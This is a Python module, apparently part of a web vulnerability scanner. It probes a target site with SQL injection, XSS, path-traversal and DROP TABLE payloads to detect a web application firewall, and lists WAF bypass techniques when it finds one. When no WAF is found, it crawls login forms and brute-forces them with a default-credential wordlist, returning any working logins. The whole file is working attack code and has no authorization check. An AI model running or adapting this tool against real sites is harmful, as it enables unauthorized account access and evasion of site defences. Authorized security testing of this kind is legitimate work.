"""
bruteforce_scanner.py
─────────────────────
Tests whether a target has a Web Application Firewall (WAF) and, if not,
performs a login brute-force attempt against any discovered login forms.

WAF detection strategy
  1. Send benign request, record baseline status / headers.
  2. Send obviously malicious payloads (SQLi + XSS).
  3. If the server returns 403/406/429/503 or injects well-known WAF headers
     → WAF detected, mark as protected.
  4. If the server returns identical 200 on all payloads → likely no WAF.

Brute-force strategy
  • Crawl login-like forms (action contains login/signin/auth/account).
  • Try a small wordlist of common credentials.
  • Stop per-form as soon as a valid login is found (or wordlist exhausted).
  • Detect successful login by: HTTP 302 to non-login URL, or response
    that lacks a password field, or body size grows significantly.
"""

import time
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# ── Constants ────────────────────────────────────────────────────────────

REQUEST_TIMEOUT = 8

# Known WAF signature headers  (header-name → partial-value)
WAF_HEADERS = {
    "x-sucuri-id":         None,
    "x-sucuri-cache":      None,
    "x-firewall-protection": None,
    "server":              "cloudflare",
    "x-cdn":               "imperva",
    "x-iinfo":             None,       # Incapsula
    "x-protected-by":      None,
    "x-waf-event-info":    None,
    "x-amzn-waf-action":   None,       # AWS WAF
    "x-azure-ref":         None,
    "cf-ray":              None,       # Cloudflare
}

# Payloads designed to trip a WAF
WAF_PROBE_PAYLOADS = [
    "' OR 1=1--",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "UNION SELECT NULL,NULL,NULL--",
    "; DROP TABLE users--",
]

# Status codes that typically mean a WAF blocked the request
WAF_BLOCK_CODES = {403, 406, 429, 503, 501}

# Common username / password pairs to try
DEFAULT_WORDLIST = [
    ("admin",    "admin"),
    ("admin",    "password"),
    ("admin",    "123456"),
    ("admin",    "admin123"),
    ("admin",    "letmein"),
    ("root",     "root"),
    ("root",     "toor"),
    ("root",     "password"),
    ("user",     "user"),
    ("user",     "password"),
    ("test",     "test"),
    ("test",     "password"),
    ("guest",    "guest"),
    ("admin",    "qwerty"),
    ("administrator", "administrator"),
    ("administrator", "password"),
]

# Keywords that suggest a URL / form is a login endpoint
LOGIN_KEYWORDS = ("login", "signin", "sign-in", "auth", "account", "session", "wp-login")


# ── Helpers ──────────────────────────────────────────────────────────────

def _session():
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (compatible; WebVulnScan/1.0)"
    })
    return s


def _has_waf_header(response):
    """Return (True, header_name) if a WAF header is present."""
    for header, expected_val in WAF_HEADERS.items():
        val = response.headers.get(header, "")
        if val:
            if expected_val is None or expected_val.lower() in val.lower():
                return True, f"{header}: {val}"
    return False, None


def _is_login_url(url):
    return any(kw in url.lower() for kw in LOGIN_KEYWORDS)


def _find_login_forms(target, session):
    """
    Crawl the target page and return a list of dicts:
      { url, action, user_field, pass_field, extra_fields }
    """
    forms = []
    try:
        r = session.get(target, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        soup = BeautifulSoup(r.text, "html.parser")
    except Exception:
        return forms

    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "post").lower()
        full_action = urljoin(target, action) if action else target

        inputs = form.find_all("input")
        user_field = None
        pass_field = None
        extra = {}

        for inp in inputs:
            name = inp.get("name", "")
            itype = inp.get("type", "text").lower()
            val = inp.get("value", "")
            if not name:
                continue
            if itype == "password":
                pass_field = name
            elif itype in ("text", "email") and not user_field:
                user_field = name
            elif itype not in ("submit", "button", "image", "reset"):
                extra[name] = val   # hidden fields, CSRF tokens, etc.

        if user_field and pass_field:
            forms.append({
                "url":         full_action,
                "method":      method,
                "user_field":  user_field,
                "pass_field":  pass_field,
                "extra":       extra,
            })

    return forms


def _attempt_login(session, form, username, password):
    """
    Try a single credential pair.  Returns a dict with result info.
    """
    data = dict(form["extra"])
    data[form["user_field"]] = username
    data[form["pass_field"]] = password

    try:
        t0 = time.time()
        if form["method"] == "post":
            r = session.post(form["url"], data=data, timeout=REQUEST_TIMEOUT,
                             allow_redirects=False)
        else:
            r = session.get(form["url"],  params=data, timeout=REQUEST_TIMEOUT,
                            allow_redirects=False)
        elapsed = round(time.time() - t0, 2)
    except Exception as e:
        return {"success": False, "error": str(e)}

    # Heuristics for success:
    # 1. Redirect (302/301) away from a login URL
    redirect_loc = r.headers.get("location", "")
    redirected_away = (
        r.status_code in (301, 302, 303, 307, 308)
        and not _is_login_url(redirect_loc)
    )

    # 2. Response body lacks a password input
    soup = BeautifulSoup(r.text, "html.parser")
    has_pass_field = bool(soup.find("input", {"type": "password"}))

    # 3. Status 200 and no password field (already logged in / redirect already consumed)
    looks_logged_in = (r.status_code == 200 and not has_pass_field)

    success = redirected_away or looks_logged_in

    return {
        "success":      success,
        "username":     username,
        "password":     password,
        "status_code":  r.status_code,
        "elapsed_s":    elapsed,
        "redirect":     redirect_loc or None,
    }


# ── Public API ───────────────────────────────────────────────────────────

def scan_bruteforce(target, wordlist=None):
    """
    Main entry point.

    Returns a dict:
    {
      "waf_detected": bool,
      "waf_detail":   str | None,       # which header / response gave it away
      "bypass_hints": list[str],        # suggestions if WAF found
      "login_forms":  int,              # number of login forms found
      "attempts":     int,
      "credentials_found": list[dict],  # [{username, password, url, status_code}]
      "blocked_payloads":  list[str],   # payloads that got a block response
    }
    """
    if wordlist is None:
        wordlist = DEFAULT_WORDLIST

    result = {
        "waf_detected":       False,
        "waf_detail":         None,
        "bypass_hints":       [],
        "login_forms":        0,
        "attempts":           0,
        "credentials_found":  [],
        "blocked_payloads":   [],
    }

    session = _session()

    # ── Step 1: WAF detection ────────────────────────────────────────────
    try:
        baseline = session.get(target, timeout=REQUEST_TIMEOUT, allow_redirects=True)
        baseline_code = baseline.status_code
        baseline_len  = len(baseline.content)

        # Check headers on baseline response
        waf_in_header, hdr_detail = _has_waf_header(baseline)
        if waf_in_header:
            result["waf_detected"] = True
            result["waf_detail"]   = f"WAF header detected: {hdr_detail}"

        # Probe with malicious payloads
        probe_url = target.rstrip("/") + "/?q="
        for payload in WAF_PROBE_PAYLOADS:
            try:
                r = session.get(probe_url + payload, timeout=REQUEST_TIMEOUT,
                                allow_redirects=False)
                # Header check on each probe response
                waf_hit, hdr = _has_waf_header(r)
                if waf_hit:
                    result["waf_detected"] = True
                    result["waf_detail"]   = result["waf_detail"] or f"WAF header on probe: {hdr}"

                if r.status_code in WAF_BLOCK_CODES:
                    result["waf_detected"]    = True
                    result["blocked_payloads"].append(payload)
                    result["waf_detail"] = result["waf_detail"] or (
                        f"Payload blocked with HTTP {r.status_code}"
                    )

                time.sleep(0.15)   # be polite
            except Exception:
                pass   # connection reset = likely blocked too
    except Exception as e:
        result["waf_detail"] = f"Error during WAF probe: {e}"
        return result

    # ── Bypass hints if WAF detected ────────────────────────────────────
    if result["waf_detected"]:
        result["bypass_hints"] = [
            "Try encoding payloads (URL-encode, double-encode, Unicode).",
            "Use case-variation: SeLeCt instead of SELECT.",
            "Insert inline comments: SE/**/LECT, <scr/**/ipt>.",
            "Test HTTP parameter pollution (duplicate parameters).",
            "Try HTTP verb tampering (HEAD / PUT / PATCH).",
            "Use chunked transfer encoding to bypass body inspection.",
        ]
        # WAF detected — skip brute-force (would be blocked anyway)
        return result

    # ── Step 2: Find login forms ─────────────────────────────────────────
    forms = _find_login_forms(target, session)
    result["login_forms"] = len(forms)

    if not forms:
        return result

    # ── Step 3: Brute-force ──────────────────────────────────────────────
    for form in forms:
        found = False
        for username, password in wordlist:
            result["attempts"] += 1
            attempt = _attempt_login(session, form, username, password)
            time.sleep(0.1)   # throttle

            if attempt.get("success"):
                result["credentials_found"].append({
                    "username":    attempt["username"],
                    "password":    attempt["password"],
                    "url":         form["url"],
                    "status_code": attempt.get("status_code"),
                    "redirect":    attempt.get("redirect"),
                })
                found = True
                break   # stop on first valid cred per form

        if found:
            break   # stop after first successful form

    return result